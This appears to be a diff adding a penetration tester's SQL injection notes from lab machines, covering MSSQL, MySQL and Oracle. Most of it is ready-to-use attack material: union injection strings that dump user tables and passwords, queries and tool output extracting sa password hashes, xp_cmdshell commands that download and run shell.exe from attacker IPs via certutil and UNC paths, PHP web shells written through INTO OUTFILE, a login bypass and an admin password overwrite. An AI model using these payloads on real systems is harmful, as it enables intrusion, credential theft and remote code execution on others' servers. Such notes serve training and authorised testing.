@@ -1,0 +1,236 @@
+# Injection
+https://www.invicti.com/blog/web-security/sql-injection-cheat-sheet/
+https://portswigger.net/web-security/sql-injection/cheat-sheet
+https://pentestlab.blog/2012/12/24/sql-injection-authentication-bypass-cheat-sheet/
+
+# Enumeration
+1) check unintended results
+	# 192.168.X.209 DC-9
+	EX: "moe' or 1=1#" should only provide one response but it provided all users
+1) 'order by 1--		# check for size of input
+2) gather information
+	version
+	username
+	important databases
+	user creds
+3) shell commands		# mssql
+
+
+# MSSQL
+https://pentestmonkey.net/cheat-sheet/sql-injection/mssql-sql-injection-cheat-sheet
+https://www.exploit-db.com/raw/12975
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MSSQL%20Injection.md
+
+# Enumeration
+select @@version
+select user_name()
+select system_user
+select name FROM master..syslogins
+select name FROM master..sysdatabases
+# List tables from current database
+select name FROM sysobjects WHERE xtype = 'U'
+select column_name FROM information_schema.columns WHERE table_name = '<table name>'
+# List values
+select <column name> FROM <table name>
+# Pull tables names from a different database.
+select table_name from <db_name>.information_schema.tables
+# Pull the sa username and password.
+select name from master.sys.sql_logins
+select master.sys.fn_varbintohexstr(password_hash) from master.sys.sql_logins
+
+# Location of database files
+# 10.11.1.111 1NSIDER
+https://stackoverflow.com/questions/5490631/where-is-the-default-location-for-all-databases-in-sql-server
+https://www.sqlshack.com/move-sql-database-files-mdf-ldf-another-location/
+https://www.nucleustechnologies.com/blog/mdf-file-location-in-sql-server-2014-2016-2017/
+https://database.guide/how-to-find-the-location-of-data-files-and-log-files-in-sql-server/
+https://docs.microsoft.com/en-us/sql/relational-databases/databases/database-files-and-filegroups?view=sql-server-ver15
+
+# Get-MDFHashes
+# We can get password hashes from the master.mdf file
+https://blog.xpnsec.com/extracting-master-mdf-hashes/
+https://github.com/xpn/Powershell-PostExploitation/issues/1
+# We will need to make a slight adjustment to get it to work
+```
+Try {
+    #[Reflection.Assembly]::LoadFile($currentLocation.Path + "\\OrcaMDF.RawCore.dll") | Out-Null
+    #[Reflection.Assembly]::LoadFile($currentLocation.Path + "\\OrcaMDF.Framework.dll") | Out-NUll
+    #[Reflection.Assembly]::LoadFile($PSScriptRoot + "\\OrcaMDF.RawCore.dll") | Out-Null
+    #[Reflection.Assembly]::LoadFile($PSScriptRoot + "\\OrcaMDF.Framework.dll") | Out-NUll
+    Add-Type -AssemblyName .\OrcaMDF.RawCore.dll
+    Add-Type -AssemblyName .\OrcaMDF.Framework.dll
+} Catch {
+    Write-Host "Could not load OrcaMDF libraries, please make sure that you run Import-Module from the dir containing OrcaMDF.RawCore.dll and OrcaMDF.Framework.dll"
+}
+```
+```
+$ pwsh
+PowerShell 7.0.0
+Copyright (c) Microsoft Corporation. All rights reserved.
+
+https://aka.ms/powershell
+Type 'help' to get help.
+
+   A new PowerShell stable release is available: v7.2.2 
+   Upgrade now, or check out the release page at:       
+     https://aka.ms/PowerShell-Release?tag=v7.2.2       
+
+PS > Import-Module ./Get-MDFHashes.ps1
+PS > Get-MDFHashes -mdf ./master.mdf
+
+Name                           Value
+----                           -----
+##MS_SmoExtendedSigningCertif… 
+##xp_cmdshell##                
+sa                             0x0200318835DF285D7508DB55BFABEF7B373E27D3ABDEADF953C3035F45237D08A00B1DFFB3A936128BB508B9D799777526F11BE65AB12F9D2A453FE18989D75F91369E0E4288
+securityadmin                  
+NT Service\MSSQL$SQLEXPRESS    
+##SQL Mail XPs##               
+##MS_SQLAuthenticatorCertific… 
+##MS_PolicyEventProcessingLog… 0x020077704623C216D1B78D5396A0E3F005BB2EB6DAE2BBA6B6608418C2557DD671C8F656DB75CFE1D9052CE1D24B725B8704E0521ADE70BBE9555E54EC4CCADCD81EED16D04D
+##MS_SQLResourceSigningCertif… 
+##Database Mail XPs##          
+public                         
+diskadmin                      
+##MS_PolicySigningCertificate… 
+processadmin                   
+##Replication XPs##            
+serveradmin                    
+##Ole Automation Procedures##  
+1NSIDER\Administrator          
+NT SERVICE\Winmgmt             
+setupadmin                     
+NT AUTHORITY\SYSTEM            
+##Web Assistant Procedures##   
+NT SERVICE\SQLTELEMETRY$SQLEX… 
+##MS_PolicyTsqlExecutionLogin… 0x0200336C311054FB81DB25F6AA00AA4450BF953A6C6412DAFB5857DAFCBB070ABC6BA4A3F886A03459B1D20612A6ED2026825ECBE6C6CE905AF466172D35B374D1EEB23A2B87
+##Agent XPs##                  
+##SMO and DMO XPs##            
+##Ad Hoc Distributed Queries## 
+##MS_SQLReplicationSigningCer… 
+bulkadmin                      
+sysadmin                       
+NT SERVICE\SQLWriter           
+dbcreator                      
+BUILTIN\Users                  
+##MS_AgentSigningCertificate## 
+
+PS > 
+```
+
+# Backup files
+# There are backup files that we can access that are not locked by a running mssql server
+https://blog.xpnsec.com/extracting-master-mdf-hashes/
+# 10.11.1.111 1NSIDER
+tftp> get \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf
+getting from 10.11.1.111:\PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf to \PROGRA~1\MICROS~1\MSSQL1~1.SQL\MSSQL\Backup\master.mdf [octet]
+Received 4194304 bytes in 439.4 seconds [76364 bits/sec]
+
+# xp_cmdshell
+# We can execute shell commands from within mssql
+https://www.sqlshack.com/use-xp-cmdshell-extended-procedure/
+mssqlclient.py sa@<ip>
+	SELECT IS_SRVROLEMEMBER('sysadmin') as isAdmin;
+	SELECT SYSTEM_USER;
+	EXEC sp_configure 'show advanced options', 1; RECONFIGURE;
+	EXEC sp_configure 'xp_cmdshell', 1; RECONFIGURE;
+	EXEC master..xp_cmdshell 'whoami'
+	# 10.11.1.31 RALPH
+	# 10.11.1.128 DJ
+	EXEC master..xp_cmdshell '\\192.168.119.206\juju\shell.exe';
+	# 10.11.1.111 1NSIDER
+	exec xp_cmdshell 'certutil.exe -urlcache -split -f "http://192.168.119.164/shell.exe" C:\Windows\TEMP\shell.exe'
+	
+
+# Error based sql injection
+# 10.11.1.229 MAIL
+' + convert(int,@@version) + '
+# how to get int return value. concat with string
+' + convert(int,concat((select top 1 IS_SRVROLEMEMBER('sysadmin') as isAdmin), ' a')) + '
+0 a
+	
+	
+# MySQL
+https://pentestmonkey.net/cheat-sheet/sql-injection/mysql-sql-injection-cheat-sheet
+# 192.168.X.209 DC-9
+# get version
+moe' union select @@version,2,3,4,5,6#
+# get user
+moe' union select user(),2,3,4,5,6#
+# get system user
+moe' union select system_user(),2,3,4,5,6#
+# get privileges
+moe' union select grantee,privilege_type,is_grantable,4,5,6 from information_schema.user_privileges#
+# get the current database
+moe' union select database(),2,3,4,5,6#
+# get all databases
+moe' union select schema_name,2,3,4,5,6 from information_schema.schemata#
+# get columns
+moe' union select table_schema,table_name,column_name,4,5,6 from information_schema.columns where table_schema != 'mysql' and table_schema != 'information_schema'#
+# get tables
+moe' union select table_schema,table_name,3,4,5,6 from information_schema.tables where table_schema != 'mysql' and table_schema != 'information_schema'#
+# get UserID, Username, and Password values from current database and Users table
+# moe' union select UserID,Username,Password,4,5,6 from Users#
+# get id, username and password from UserDetails table in users database
+# moe' union select id,username,password,4,5,6 from users.UserDetails#
+
+# Write data to file
+# 10.11.1.73 GAMMA
+http://10.11.1.73:8080/php/index.php?tg=delegat&idx=mem&id=1 UNION ALL SELECT 0x74657374696e67,2 INTO OUTFILE 'C:\\wamp\\www\\juju.php'--
+# 192.168.X.211 Election1
+aksi=fetch&id=1 UNION SELECT 'a','b','c','d','<?php echo "<pre>";echo shell_exec($_REQUEST["c"]);echo "</pre>";?>' INTO OUTFILE '/var/www/html/shell.php'--
+
+# Write to database
+https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/SQL%20Injection/MySQL%20Injection.md#mysql-write-a-shell
+# 192.168.X.74 My-CMSMS
+$ mysql -h 192.168.76.74 -u root -p
+MySQL [cmsms_db]> update cms_users set password = (select md5(CONCAT(IFNULL((SELECT sitepref_value FROM cms_siteprefs WHERE sitepref_name = 'sitemask'),''),'password'))) where username = 'admin';
+
+# Shell
+sudo mysql -u root -p
+MariaDB [(none)]> \! sh
+\! sh
+# whoami
+whoami
+root
+
+# Tunnel
+# See page 777 in pwk pdf for setting up a reverse ssh tunnel.  This will let us log in with local host.
+
+# UDF
+# If mysqld is running as root and we have creds, we can get root execution
+https://www.exploit-db.com/docs/english/44139-mysql-udf-exploitation.pdf
+https://recipeforroot.com/mysql-to-system-root/
+
+# Oracle
+https://pentestmonkey.net/cheat-sheet/sql-injection/oracle-sql-injection-cheat-sheet
+# 10.11.1.222 CHRIS
+# get version
+' union select banner,NULL,NULL from v$version--
+# list users
+' union select username,NULL,NULL from all_users--
+# list current database
+' union select global_name,NULL,NULL from global_name--
+# list all database
+' union select distinct owner,NULL,NULL from all_tables--
+# list tables
+' union select owner,table_name,NULL from all_tables--
+# list columns from WEB_ADMINS
+' union select column_name,NULL,NULL from all_tab_columns where table_name = 'WEB_ADMINS'--
+# view admin_names and passwords from WEB_ADMINS table in WEB_APP database
+' union select ADMIN_NAME,PASSWORD,NULL from WEB_APP.WEB_ADMINS--
+# list columns from WEB_USERS
+' union select column_name,NULL,NULL from all_tab_columns where table_name = 'WEB_USERS'--
+# view user_names and passwords from WEB_ADMINS table in WEB_APP database
+' union select USER_NAME,PASSWORD,NULL from WEB_APP.WEB_USERS--
+	
+
+
+# Exploits
+# 10.11.1.128 DJ		# MSSQL
+# Login
+admin' or '1'='1'--
+# Execute shell
+'; EXEC master..xp_cmdshell '\\192.168.119.170\juju\shell.exe'--
+# 10.11.1.31 RALPH
+SQL> exec xp_cmdshell '\\192.168.119.207\juju\shell.exe';
